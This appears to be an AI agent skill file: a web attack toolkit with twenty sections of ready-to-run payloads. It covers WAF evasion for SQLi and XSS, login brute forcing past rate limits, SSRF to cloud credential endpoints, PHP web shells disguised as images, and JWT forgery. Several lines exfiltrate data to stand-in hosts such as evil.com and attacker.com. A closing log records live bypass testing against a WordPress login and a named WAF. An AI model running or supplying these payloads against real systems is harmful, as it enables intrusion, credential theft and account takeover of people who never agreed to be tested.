---
name: web-bypass
description: Comprehensive bypass toolkit — 100+ techniques to evade WAF, rate limits, auth, filters, and protections. Covers all major WAF engines and common security controls.
---

# Web Bypass Toolkit

## Index

| # | Kategori | Sub-teknik |
|---|----------|-----------|
| 1 | WAF SQLi Bypass | Tamper, Comment, Case, HPP, Null Byte, Chunked, Encoding |
| 2 | WAF XSS Bypass | Polyglot, Encoding, CSP bypass, Event handler variants |
| 3 | 403/Unauthorized Bypass | Header spoof, Method brute, Path traversal, Encoding |
| 4 | Rate Limit Bypass | IP rotation, Header rotation, Timing, Spraying, Parallel |
| 5 | SSRF Bypass | IP obfuscation, DNS rebinding, Redirect, URL parser |
| 6 | File Upload Bypass | Extension, Content-type, Magic bytes, .htaccess, Race |
| 7 | JWT Bypass | alg none, RS→HS, kid, JWK, weak secret, exp |
| 8 | LFI Bypass | Wrappers, Encoding, Null byte, Path traversal |
| 9 | GraphQL Bypass | Introspection, Alias, Fragment, Depth, GET method |
| 10 | Open Redirect Bypass | Unicode, Encoding, CRLF, Protocol confusion |
| 11 | CORS Bypass | null origin, Regex, Subdomain, Preflight |
| 12 | Captcha Bypass | OCR, Token reuse, Header, Parameter removal |
| 13 | WAF Fingerprinting | Error analysis, Response headers, Timing |
| 14 | Blind Testing | OOB, Timing, Boolean, Error-based |
| 15 | Auth Bypass | Default creds, Session prediction, JWT manipulation |
| 16 | OAuth Bypass | CSRF, redirect_uri, state leakage |
| 17 | WebSocket Bypass | Origin, Auth, CSWSH |
| 18 | CSP Bypass | Nonce leak, CDN, JSONP, Dangling markup |
| 19 | Prototype Pollution Bypass | Key variants, Nested paths |
| 20 | SSTI Bypass | Filter evasion, Alternative delimiters |

---

## 1 — WAF Bypass: SQLi

### Tamper Scripts (sqlmap)

```bash
sqlmap -u "http://target/page?id=1" \
  --tamper=space2comment,randomcase,between,charencode,percentage,bluecoat,modsecurityversioned,versionedkeywords \
  --batch --level=3 --risk=2
```

### Comment Injection

```sql
'/**/OR/**/1=1/**/--
'/*!OR*/1=1--
'/*!50000OR*/1=1--
'||'1
'/*!UNION*/ /*!SELECT*/ 1,2,3--
```

### Case Variation

```sql
UnIoN SeLeCt 1,2,3
uniON selECt 1,froM dual
uNIoN aLL SelEcT 1,2,3
```

### HTTP Parameter Pollution (HPP)

```bash
?page=1&page=2&page=1' UNION SELECT 1,2,3--  # WAF checks first/last, DB gets all
?id=1&id=1&id=1' UNION SELECT 1,2,3--
```

### Null Byte

```sql
' OR 1=1 %00--
' UNION SELECT%001,2,3--
```

### Chunked Transfer Encoding

```bash
# Bypass mod_security regex
curl -H "Transfer-Encoding: chunked" \
  --data-binary $'1\r\n?\r\n4\r\n?id=\r\n23\r\n1\' UNION SELECT 1,2,3--\r\n0\r\n\r\n' \
  "http://target/page"
```

### Encoding Variations

```sql
# URL encoding (partial)
'%20OR%201=1--           # space encoding
'%252f%252a%252fUNION%252f%252a%252fSELECT  # double URL

# Unicode encoding
%uff08' %uff09OR 1=1--   # fullwidth parentheses

# Hex encoding
' OR 0x1=0x1--
' UNION SELECT 0x61646d696e,2,3--

# HTML entity (if reflected in HTML)
&#x27; OR 1=1--
```

### WAF-Specific Bypasses

```bash
# Cloudflare: add random parameter
?id=1&1593726419=1' UNION SELECT 1,2,3--

# ModSecurity: chunked encoding
curl -H "Transfer-Encoding: chunked" ...

# AWS WAF: newline after UNION
' UNION\nSELECT 1,2,3--

# F5 BIG-IP: parameter pollution
?id=1&id=1&id=1' UNION SELECT 1,2,3--
```

---

## 2 — WAF Bypass: XSS

### Event Handler Variants

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert&#40;1&#41;>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video onloadstart=alert(1) src=x>
<marquee onstart=alert(1)>
```

### Polyglot

```html
" onmouseover="alert(1)" "
' onclick='alert(1)' '
javascript:alert(1)//"//'>/*</script></svg></textarea>
```

### Encoding

```html
# HTML entities
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# Unicode escapes (JS context)
\u003cscript\u003ealert(1)\u003c/script\u003e

# Base64 (if eval() available)
eval(atob('YWxlcnQoMSk='))

# Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E

# CSS encoding (if style context)
background:url(javascript:alert(1));
```

### Tag Without Parentheses

```html
<script>location='javascript:alert%26lpar;1'</script>
<script>location='javascript:alert\\(1\\)'</script>
<img src=x onerror=location='javascript:alert\x281\x29'>
```

### Multi-byte Charset Bypass

```html
<meta charset="shift_jis">
<script>alert(1)</script>  <!-- shift_jis may eat the backslash before -->
```

### Dangling Markup

```html
<img src="http://evil.com/?exfil=
<!-- steal data until next '> or " -->
```

---

## 3 — 403 / Unauthorized Bypass

### Header Spoofing

```bash
# IP-based access
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin
curl -H "X-Real-IP: 127.0.0.1" http://target/admin
curl -H "X-Originating-IP: 127.0.0.1" http://target/admin
curl -H "X-Remote-IP: 127.0.0.1" http://target/admin
curl -H "X-Remote-Addr: 127.0.0.1" http://target/admin
curl -H "X-Client-IP: 127.0.0.1" http://target/admin
curl -H "X-Host: 127.0.0.1" http://target/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" http://target/admin
```

### Auth Role Headers

```bash
curl -H "X-Auth-Role: admin" http://target/
curl -H "X-Admin: true" http://target/
curl -H "X-Role: admin" http://target/
curl -H "X-Access-Level: root" http://target/
curl -H "X-Privilege: admin" http://target/
curl -H "X-Is-Admin: true" http://target/
curl -H "X-User-Role: administrator" http://target/
```

### Referer/Origin Spoof

```bash
curl -H "Referer: https://internal.target.com/admin" http://target/admin
curl -H "Origin: https://internal.target.com" http://target/admin
curl -H "Referer: http://target.com/admin" http://target/admin
```

### HTTP Method Brute

```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
  echo "$method: $(curl -s -o /dev/null -w '%{http_code}' -X $method http://target/admin)"
done
```

### HTTP Method Override

```bash
curl -X POST -H "X-HTTP-Method-Override: GET" http://target/admin
curl -X GET -H "X-HTTP-Method: DELETE" http://target/admin
curl -X POST -H "X-HTTP-Method-Override: PUT" http://target/admin
curl -X POST -H "X-Method-Override: GET" http://target/admin
curl -H "X-Original-URL: /admin" http://target/
curl -H "X-Rewrite-URL: /admin" http://target/
```

### Path Traversal

```bash
//admin//
/./admin/
/admin;/
/admin..;/
/Admin/
/ADMIN/
/aDmIn/
/admin/./
/%61dmin          # single char encode
/%61%64%6d%69%6e  # full path encode
/%2561dmin         # double encode
/%252fadmin        # double encode slash
```

### Extension Bypass

```bash
/admin%00.txt      # null byte
/admin..txt        # dot bypass
/admin;.txt        # parameter
/admin.jsp         # valid extension bypass
/admin.html        # valid extension bypass
```

### Hidden Service Endpoints

```bash
# Common admin/internal paths
/actuator/ /swagger/ /grafana/ /kibana/ /manager/
/console/ /jenkins/ /prometheus/ /metrics/ /health/
/.env /admin/ /api/ /v1/ /v2/ /internal/
```

### Multilayer Combo

```bash
# All at once
curl -H "X-Forwarded-For: 127.0.0.1" \
  -H "Referer: https://internal.target.com/admin" \
  -H "X-HTTP-Method-Override: GET" \
  -X POST "http://target/%2561dmin"
```

---

## 4 — Rate Limit Bypass

### IP Rotation

```bash
# X-Forwarded-For rotation
for i in {1..100}; do
  curl -H "X-Forwarded-For: 10.0.0.$i" http://target/login -d "user=admin&pass=test$i"
done

# X-Real-IP rotation
for i in {1..100}; do
  curl -H "X-Real-IP: 192.168.1.$i" http://target/login -d "user=admin&pass=test$i"
done

# Client-IP rotation
for i in {1..100}; do
  curl -H "Client-IP: 172.16.0.$i" http://target/login -d "user=admin&pass=test$i"
done
```

### IPv6 Rotation (if supported)

```bash
# X-Forwarded-For with IPv6
for i in {1..100}; do
  curl -H "X-Forwarded-For: ::ffff:10.0.0.$i" http://target/login -d "..."
done
```

### Header Rotation

```bash
for i in {1..100}; do
  user_agents=("Mozilla/5.0" "Chrome/120" "Safari/605" "Edge/120" "Firefox/121")
  curl -A "${user_agents[$RANDOM % ${#user_agents[@]}]}" \
    -H "Accept-Language: en-US,en;q=$((RANDOM % 10)).$((RANDOM % 9))" \
    http://target/login -d "user=admin&pass=test$i"
done
```

### Cookie Rotation

```bash
for i in {1..100}; do
  curl -b "session=deadbeef$(printf '%04x' $RANDOM)" \
    http://target/api/rate-limited
done
```

### Timing Bypass

```bash
# Random delay
for i in {1..100}; do
  sleep 0.$((RANDOM % 9))
  curl http://target/login -d "user=admin&pass=test$i"
done

# Slow drip (under burst detector)
sleep 1
curl http://target/login -d "user=admin&pass=test"
sleep 1
```

### Multi-endpoint Rotation

```bash
# Rotate login endpoints
endpoints=("/login" "/api/login" "/auth" "/api/auth" "/signin")
for i in {1..100}; do
  ep=${endpoints[$((i % ${#endpoints[@]}))]}
  curl -X POST "http://target$ep" -d "user=admin&pass=test$i"
done
```

### Password Spraying

```bash
# 1 password → many usernames (avoids account lockout)
for user in $(cat users.txt); do
  curl http://target/login -d "user=$user&pass=Password123"
done
```

### Parallel Burst

```bash
# 50 parallel requests before rate limiter increments
seq 1 50 | xargs -P 50 -I {} curl -s http://target/api/resource
```

### JWT Rotation

```bash
# Get 10+ tokens, rotate each request
for token in "${tokens[@]}"; do
  curl -H "Authorization: Bearer $token" http://target/api/resource
done
```

### Proxy Rotation

```bash
# (if proxies available)
for proxy in $(cat proxies.txt); do
  curl -x "http://$proxy" http://target/api/resource
done
```

---

## 5 — SSRF Bypass

### IP Obfuscation

```bash
# Decimal
http://2130706433/                    # 127.0.0.1
http://3232235521/                    # 192.168.0.1
http://167772161/                     # 10.0.0.1

# Octal
http://0177.0.0.1/                    # 127.0.0.1
http://017700000001/                  # 127.0.0.1

# Hex
http://0x7f000001/                    # 127.0.0.1
http://0x0a000001/                    # 10.0.0.1

# Mixed radix
http://0x7f.0.0.1/                    # 127.0.0.1
http://0x7f.1/                        # 127.0.1

# IPv6 loopback
http://[::1]:8080/admin
http://[0:0:0:0:0:ffff:127.0.0.1]:80
http://[::ffff:127.0.0.1]:80
```

### DNS Rebinding

```bash
# Domain that alternates between public and private IP
http://1e100.net/                     # Google, but resolves to multiple IPs
http://spoofed.burpcollaborator.net/  # Attacker-controlled DNS

# Long TTL bypass
# Register domain with 0 TTL → after first resolution, change IP to internal
```

### Redirect Bypass

```bash
# Find open redirect on target → chain to internal
# Step 1: Find open redirect on target.com
http://target.com/redirect?to=http://evil.com/
# Step 2: If it redirects, inject SSRF via that redirect
http://target.com/redirect?to=http://169.254.169.254/
```

### URL Parser Confusion

```bash
# Different parsers interpret differently between WAF and backend
http://evil.com:80@127.0.0.1:80/admin     # @ confusion
http://127.0.0.1%23.evil.com/             # fragment confusion
http://127.0.0.1%00.evil.com/             # null byte
http://evil.com#@127.0.0.1                # hash vs auth
http://evil.com\@127.0.0.1/               # backslash
```

### Short URLs

```bash
http://0/                # 0.0.0.0
http://127.1/             # 127.0.0.1
http://127.0.1/           # 127.0.0.1
http://0x0/               # 0.0.0.0
```

### Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

### DNS-based OOB

```bash
# Blind data exfil via DNS
?url=http://$(whoami).attacker.com/
?url=http://$(cat /etc/passwd | base64).attacker.com/
```

---

## 6 — File Upload Bypass

### Extension Bypass

```bash
# Case variation
shell.PhP shell.pHp5 shell.Php7 shell.Phtml

# Double extension
shell.php.jpg shell.php.png shell.php5.gif shell.phtml.jpg

# Known executable extensions
shell.php5 shell.php7 shell.pht shell.phtml shell.shell
shell.php.jpg shell.php;.jpg shell.php%00.jpg

# Reverse double extension
shell.jpg.php image.png.php

# Apache-specific
shell.php.xyz shell.php.123          # mod_mime
shell.php.xxx                        # if unknown = application/x-httpd-php
```

### Content-Type Bypass

```bash
curl -F "file=@shell.php;type=image/jpeg" http://target/upload
curl -F "file=@shell.php;type=image/png" http://target/upload
curl -F "file=@shell.php;type=application/pdf" http://target/upload
curl -F "file=@shell.php;type=text/plain" http://target/upload
curl -F "file=@shell.php;type=application/x-httpd-php" http://target/upload
```

### Magic Bytes Bypass

```bash
# GIF
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# JPEG
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# PNG
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# PDF
printf '%PDF-1.4\n<?php system($_GET["cmd"]); ?>' > shell.pdf.php
```

### .htaccess Override

```bash
# Method 1: AddType
echo 'AddType application/x-httpd-php .txt' > .htaccess

# Method 2: SetHandler
echo 'SetHandler application/x-httpd-php' > .htaccess

# Method 3: ForceType
echo 'ForceType application/x-httpd-php' > .htaccess
```

### Race Condition Upload

```bash
# Upload and access before validation/move
for i in {1..100}; do
  curl -F "file=@shell.php" "http://target/upload?ts=$i" &
  curl -s "http://target/uploads/shell.php?cmd=id" &
done
wait
```

### Polyglot Files

```bash
# GIF+PHP (GD resize stops at GIF89a, but PHP still parses)
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# JPEG+PHP (stops at FFD9 end marker)
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>\xff\xd9' > shell.jpg.php
```

### Unicode/Normalization Bypass

```bash
# Windows/nginx normalization bypass
shell.php:%80                    # Windows strips %80
shell.php::DATA                  # NTFS ADS
shell.php.:shell.php             # Windows dot truncation

# Unicode extension
shell.php%ef%bc%85jpg            # Unicode dot
```

---

## 7 — JWT Bypass

### alg: none

```python
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "", algorithm="none")
# Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### RS256 → HS256 (Algorithm Confusion)

```python
import jwt
# When server has RSA public key leaked:
pub = open("public.pem").read()
token = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
# Server uses public key as HMAC secret (which it knows)
```

### kid Injection

```json
// Path traversal to predictable file
{"kid":"../../../dev/null"}

// SQLi to return known value
{"kid":"' UNION SELECT 'anything'--"}

// Environment variable
{"kid":"/proc/sys/kernel/random/boot_id"}

// File with known content
{"kid":"/etc/passwd"}
```

### JWK Injection

```python
import jwt, cryptography
# Generate your own RSA key → inject into jwk header
token = jwt.encode(
    {"user":"admin"},
    private_key,
    algorithm="RS256",
    headers={"jwk": public_jwk}
)
```

### Weak Secret Cracking

```bash
# Crack with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Crack with jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets
secret password 123456 admin changeme jwt_secret key
```

### exp Bypass

```json
// Set expiration to far future
{"exp": 9999999999}

// Set exp to 0 (some servers skip validation)
{"exp": 0}

// Remove exp entirely
{"user": "admin"}

// Set nbf (not before) to past
{"nbf": 0}
```

---

## 8 — LFI Bypass

### PHP Wrapper Bypasses

```bash
# Filter chaining
php://filter/read=convert.base64-encode/resource=index
php://filter/read=consumed=convert.base64-encode/resource=index
php://filter/read=zlib.deflate/read=convert.base64-encode/resource=index

# Double encoding
php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd

# Null byte (PHP < 5.3)
?page=../../../etc/passwd%00
```

### Path Traversal Bypass

```bash
# Double dot bypass
?page=....//....//....//etc/passwd
?page=....\/....\/....\/etc/passwd

# Encoded
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
?page=..%252f..%252f..%252fetc/passwd

# Long path
?page=....//....//....//etc/./passwd
?page=..\\/..\\/..\\/etc/passwd

# Absolute path
?page=/etc/passwd
?page=/etc/passwd%00
```

### Log Poisoning

```bash
# Inject PHP into access log
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target/
?page=../../../var/log/apache2/access.log&c=id

# Inject PHP into PHP session
?page=../../../tmp/sess_<php_session_id>&c=id
# First create session with crafted value
curl -c /tmp/cookies.txt http://target/
curl -b /tmp/cookies.txt "http://target/?<?php system('id');?>"
```

---

## 9 — GraphQL Bypass

### Introspection (if disabled)

```graphql
# Unicode escape
\u005f\u005fschema\u007b\u0074\u0079\u0070\u0065\u0073\u007b\u006e\u0061\u006d\u0065\u007d\u007d

# GET method (whitelist may only block POST)
curl -G --data-urlencode 'query={__schema{types{name}}}' http://target/graphql

# Fragment alias
query={s:__schema{types{name}}}
```

### Alias-based Enumeration

```graphql
query {
  u0: user(id: 1) { email }
  u1: user(id: 2) { email }
  u2: user(id: 3) { email }
}
```

### Fragment Depth Bypass (DoS)

```graphql
fragment T on __Type {name}
fragment T2 on __Type {name}
query {
  __schema {
    types {
      ...T
      ...T2
    }
  }
}
```

### GET-based Query

```bash
# Rate limit may only apply to POST
curl -G "http://target/graphql" --data-urlencode 'query={__schema{types{name}}}'
```

### Batching (Rate Limit)

```graphql
query {
  a: user(id: 1) { email }
  b: user(id: 2) { email }
  c: user(id: 3) { email }
}
```

---

## 10 — Open Redirect Bypass

### URL Confusion

```bash
# Backslash
https://target.com\\evil.com

# Unicode homograph (Cyrillic)
https://tаrget.com/                     # Cyrillic 'а' (U+0430)

# Protocol-relative
//evil.com

# @ confusion
https://target.com@evil.com

# Hash confusion
https://evil.com#@target.com

# Triple slash
https://target.com///evil.com
```

### Encoding

```bash
# URL-encoded @
https://target.com%40evil.com

# Double URL encoding
https://target.com%252feve%252fil.com

# Unicode encoding
https://target.com/\u0065vil.com
```

### Parameter Pollution

```bash
?redirect=valid&redirect=https://evil.com
?next=valid&next=https://evil.com
?url=valid&url=https://evil.com
```

---

## 11 — CORS Bypass

### null Origin

```html
<script>
// Sandboxed iframe → Origin: null
fetch('https://target.com/api', { mode: 'no-cors' })
</script>
```

### Regex Bypass

```bash
# If .\target\.com pattern:
Origin: https://target.com.evil.com
Origin: https://target.com%40evil.com
Origin: https://evil-target.com

# If only checks suffix:
Origin: https://eviltarget.com
```

### Preflight Abuse

```bash
# OPTIONS preflight may return permissive headers
curl -X OPTIONS http://target/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"
```

### Response Splitting

```bash
# If CRLF injection possible:
curl -H "Origin: https://evil.com%0d%0aAccess-Control-Allow-Origin:%20*" \
  http://target/api
```

---

## 12 — Captcha Bypass

### OCR

```bash
tesseract captcha.png output
cat output.txt
```

### Token Reuse

```bash
# Get one valid captcha token, reuse multiple times
TOKEN=$(curl -s http://target/captcha | jq -r '.token')
for i in {1..10}; do
  curl -X POST http://target/action -d "captcha=$TOKEN&data=..."
done
```

### Header Bypass

```bash
# Common captcha bypass headers
curl -H "X-Captcha: true" http://target/action
curl -H "X-Captcha-Token: bypass" http://target/action
curl -H "X-Captcha-Response: bypass" http://target/action
curl -H "X-Validate-Captcha: false" http://target/action
```

### Parameter Removal

```bash
# Remove captcha field entirely
curl -X POST http://target/action -d "name=test&email=test@test.com"

# Empty captcha
curl -X POST http://target/action -d "name=test&email=test@test.com&captcha="
```

---

## 13 — WAF Fingerprinting

### Error Analysis

```bash
# Different WAFs respond differently to attacks
curl -s "http://target/?id=1' OR '1'='1" | head -20

# Cloudflare: 403 + cloudflare ray ID in headers
# ModSecurity: 500 or 406 + sec-* headers in response
# AWS WAF: 403 + x-amzn-RequestId
# F5 BIG-IP: 200 with custom block page
# Akamai: 403 with ak-x* headers
```
### Response Headers

```bash
curl -sI http://target/ | grep -iE 'server|cf-ray|x-s|akamai|x-amzn|sec-'
# cf-ray → Cloudflare
# x-s → SonicWall
# server: ATS → Akamai
# x-amzn-RequestId → AWS WAF
```

### Timing Analysis

```bash
# Blocked requests often respond much faster or slower
time curl -s "http://target/?id=1" > /dev/null          # normal
time curl -s "http://target/?id=1' OR '1'='1" > /dev/null  # blocked
# Compare timing difference
```

---

## 14 — Blind Testing

### OOB (Out-of-Band)

```bash
# Start OOB listener
interactsh-client

# Inject OOB payload into each parameter
# SSRF: url=http://<id>.interactsh.com/test
# SQLi: ' LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.<id>.interactsh.com\\a'))--
# XXE: <!ENTITY % callhome SYSTEM "http://<id>.interactsh.com/data">
# CMD: ;curl http://<id>.interactsh.com/$(whoami)
```

### Time-based

```bash
# Compare response times
time curl -s "http://target/page?id=1 AND 1=1" > /dev/null
time curl -s "http://target/page?id=1 AND SLEEP(5)=1" > /dev/null

# (only if delay works)
```

### Boolean-based

```bash
# Create two requests that differ only in condition
curl -s "http://target/page?id=1' AND '1'='1" | wc -c  # true
curl -s "http://target/page?id=1' AND '1'='2" | wc -c  # false
# Compare size, content, status code
```

### Error-based

```bash
# Trigger error and observe differences
curl -s "http://target/page?id=1'" | head -5
curl -s "http://target/page?id=1"  | head -5
# Error message = potential injection point
```

---

## 15 — Auth Bypass

### Default Credentials

```bash
# Common default pairs
admin/admin
admin/admin123
admin/password
admin/password123
admin/123456
admin/test
admin/letmein
administrator/administrator
root/root
root/admin
user/user
test/test
guest/guest
```

### Session Prediction

```bash
# Check session token patterns
curl -I http://target/login -d "user=test&pass=test" | grep Set-Cookie
# Incremental: 100, 101, 102
# Timestamp-based: 1700000000, 1700000001
# Weak hash: md5(username), sha1(username)
```

### Response Manipulation

```bash
# Some apps check isAdmin in response
curl -s http://target/api/me | jq '.isAdmin = true' | curl -X PUT -H "Content-Type: application/json" -d @- http://target/api/me
```

---

## 16 — OAuth Bypass

### redirect_uri Manipulation

```bash
# Open redirect in redirect_uri
https://target.com/oauth/callback?redirect_uri=https://evil.com

# Path traversal
https://target.com/oauth/callback?redirect_uri=https://target.com%2e%65vil.com

# Subdomain
https://target.com/oauth/callback?redirect_uri=https://evil.target.com
```

### CSRF on OAuth

```html
<!-- No state parameter → CSRF, attacker links their account to victim's -->
<a href="https://target.com/oauth/authorize?client_id=123&redirect_uri=https://target.com/callback&response_type=code">
  Click here
</a>
```

### state Leakage

```bash
# If state is predictable (timestamp, user_id) → CSRF without user action
```

---

## 17 — WebSocket Bypass

### Origin Check Bypass

```html
<!-- If Origin not checked, any site can connect -->
<script>
var ws = new WebSocket('wss://target.com/ws');
</script>
```

### Auth Token in Connection

```bash
# If auth is only in URL, check if tokens can be stolen via Referer
wscat -c "wss://target.com/ws?token=SECRET"
```

### CSWSH (Cross-Site WebSocket Hijacking)

```html
<!-- If cookies used for auth + no Origin check -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send('{"action":"messages"}'); };
ws.onmessage = function(e) { fetch('http://evil.com/steal?d='+btoa(e.data)); };
</script>
```

---

## 18 — CSP Bypass

### Nonce Leak

```html
<!-- If nonce is reflected in HTML before CSP check -->
<style>/* CSP nonce=abc123 */</style>
<script nonce="abc123">alert(1)</script>

<!-- If nonce appears in URL/query string -->
<script src="/script.js?nonce=abc123"></script>
```

### CDN-based Bypass

```html
<!-- If script-src includes CDN with user content -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
```

### JSONP Endpoint

```html
<!-- If target has a JSONP callback endpoint -->
<script src="https://target.com/jsonp?callback=alert(1)//"></script>
```

### Dangling Markup

```html
<!-- Exfiltrate data without inline script -->
<img src="http://evil.com/steal?data=
<!-- Page content until next quote -->
```

### file: scheme bypass

```html
<!-- If file: allowed in CSP -->
<a href="file:///etc/passwd">Passwd</a>
```

---

## 19 — Prototype Pollution Bypass

### Key Variations

```javascript
// Standard
{"__proto__":{"admin":true}}

// constructor
{"constructor":{"prototype":{"admin":true}}}

// Object.defineProperty bypass
{"__proto__":null}

// Nested constructor
{"__proto__":{"constructor":{"prototype":{"admin":true}}}}
```

### Filter Evasion

```javascript
// If __proto__ is filtered
{"["__proto__"]":{"admin":true}}     // bracket notation
{"constructor.prototype.admin":true}  // dot notation
{"__pro"+"to__":{"admin":true}}       // concatenation
```

---

## 20 — SSTI Bypass

### Filter Evasion by Engine

```python
# Jinja2: if {{ }} filtered
{% if true %}{{7*7}}{% endif %}
{% print(7*7) %}
{% include '/etc/passwd' %}
```

```php
# Twig: if {{ }} filtered
{% set x = 7*7 %}{{ x }}
{% filter upper %}hello{% endfilter %}
```

### Alternative Delimiters

```python
# Template engine may have alternative syntax
# Jinja2: {% %} {{ }} {# #}
# Twig: {% %} {{ }} {# #}
# Smarty: {* *} {{ }} 
# Mustache: {{ }}
# Handlebars: {{ }} {{{ }}}
```

---

## Live Testing — Append New Findings

> **Aturan:** Saat live testing nemu teknik bypass BARU, tambah entry baru di sini. **JANGAN edit/hapus entry lama.**

### [N+1] — Rate Limit Fingerprint + Bypass (WordPress Login)

**Target:** WordPress login page
**Payload:**
```bash
# 1. Hitung threshold pasti
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/wp-login.php" \
    -d "log=admin&pwd=wrong$i"
done | sort | uniq -c
# Threshold: request ke-19 → 429

# 2. Bypass via X-Forwarded-For rotation
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    "https://target.com/wp-login.php" \
    -d "log=admin&pwd=admin123"
done
```
**Tool:** curl
**Catatan:** Rate limit 429 setelah ~19 request. Bypass dengan rotate X-Forwarded-For per request. Reset counter setelah jeda 30-60 detik.

### [N+2] — elpan WAF Behavior Mapping

**Target:** WordPress dengan WAF elpan (portal.elpan.com)
**Payload:**
```bash
# Diblok (403)
curl -sI "https://target.com/wp-content/uploads/test.txt"
curl -sI "https://target.com/wp-includes/"
curl -sI "https://target.com/.env"

# Terbuka (200)
curl -sI "https://target.com/readme.html"
curl -sI "https://target.com/wp-json/wp/v2/users"
curl -sI "https://target.com/wp-content/plugins/smart-slider-3/readme.txt"
```
**Tool:** curl
**Catatan:** elpan WAF proteksi file/folder sensitif tapi REST API lupa diproteksi. Path upload, wp-includes, env file diblok. Tapi readme.html, REST API, plugin readme.txt terbuka.

